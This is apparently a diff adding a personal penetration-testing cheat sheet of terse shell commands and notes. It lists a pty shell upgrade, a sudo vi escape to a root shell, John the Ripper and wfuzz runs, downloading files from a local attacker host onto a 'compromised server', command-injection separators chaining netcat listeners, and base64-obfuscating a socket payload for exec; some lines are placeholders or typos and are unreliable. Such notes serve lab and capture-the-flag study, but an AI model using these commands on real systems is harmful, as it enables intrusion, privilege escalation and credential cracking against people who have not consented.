@@ -1,0 +1,53 @@
+
+cat /etc/shells
+echo "import pty; pty.spawn('/bin/bash')" > /tmp/asdf.py
+python /tmp/asdf.py
+
+Sometimes changing source of metasploit disable errors
+comment out the affected line e.g.
+
+getting root when have sudo:
+  sudo vi -c ':shell'
+  
+example JtR
+sudo ./john /tmp/password --session=neu --format=raw-md5 --wordlist=/usr/share/wordlist/example.dic –rules
+
+WFuzz
+sudo python wfuzz.py -c -z file,wordlist/general/big.txt --hc 404 http://vuln/FUZZ
+
+Upload file to compromised server 
+python -m SimpleHTTPServer
+wget -O /tmp/filename http://192.168.0.2:8000/file
+
+exec a reverse_shell.php e.g.
+php -f file.php  
+
+curl -X HEAD/POST/GET/RANDOM...
+
+su -c COMMAND → one command as root
+
+su -m  → root and stay in directory
+
+command injection:
+
+appendings
+
+	; | && || 
+  
+	ls ; nc -l -p 4444
+	ls | nc -l -p 4444
+	ls && nc -l -p 4444
+	ls 34985ihjf || nc -l -p 4444
+
+	php: escapeshellcmd
+	cmd = "ls -laH".escapeshellcmd($_RQUEST['cmd']);
+    
+
+import hashlib
+python -c exec("import socket...");
+print "import socket...".encode(‘base64‘)
+
+823452v34v234234v...==
+
+python -c "exec('823452v34v234234v….=='.decode('base64'))"
+
